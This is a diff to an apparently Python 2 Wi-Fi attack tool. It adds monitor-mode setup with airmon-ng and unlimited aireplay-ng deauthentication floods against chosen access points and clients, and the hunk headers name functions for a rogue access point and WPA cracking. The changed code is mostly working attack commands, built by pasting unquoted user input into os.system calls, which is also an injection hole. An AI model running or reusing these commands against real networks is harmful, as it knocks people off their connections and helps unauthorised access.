@@ -1,10 +1,12 @@
+#!/usr/bin/env python
+
 import os
 import sys
 import time
 from wifi import Cell, Scheme
 
-interfaz = 'wlxc04a00118487'
-#interfaz = raw_input('Network interface: ')
+#interfaz = 'wlxc04a00118487'
+interfaz = raw_input('Network interface: ')
 os.system("sudo ifconfig "+interfaz+" down")
 os.system("sudo ifconfig "+interfaz+" up")
 redes = []
@@ -68,13 +70,25 @@ def create_ap():
 
 def deauth_client():
 	ap_mac = raw_input("AP MAC:")
+	essid=raw_input("Network name:")
+	channel=raw_input("Channel:")
 	client_mac = raw_input("Client MAC:")
-	os.system("aireplay-ng -0 0 -a "+ap_mac+"-c "+client_mac+" "+interfaz)
+	os.system("sudo airmon-ng check kill")
+	os.system("sudo airmon-ng start "+interfaz+" "+channel)
+	interfaz_mon = raw_input("Monitorization interface:")
+	os.system("sudo ifconfig "+interfaz+" down")
+	os.system("aireplay-ng -0 0 -a "+ap_mac+"-c "+client_mac+" -e "+essid+" "+interfaz_mon)
 
 
 def deauth_ap():
 	ap_mac = raw_input("AP MAC:")
-	os.system("aireplay-ng -0 0 -a "+ap_mac+" "+interfaz)
+	essid=raw_input("Network name:")
+	channel=raw_input("Channel:")
+	os.system("sudo airmon-ng check kill")
+	os.system("sudo airmon-ng start "+interfaz+" "+channel)
+	interfaz_mon = raw_input("Monitorization interface:")
+	os.system("sudo ifconfig "+interfaz+" down")
+	os.system("aireplay-ng -0 0 -a "+ap_mac+" -e "+essid+" "+interfaz_mon)
 
 
 def crack_wpa():
@@ -137,5 +151,12 @@ def scan():
 		count+=1
 	menu()
 
-scan()
-menu()
+
+def main():
+	scan()
+	menu()
+
+
+
+if __name__ == "__main__":
+    main()
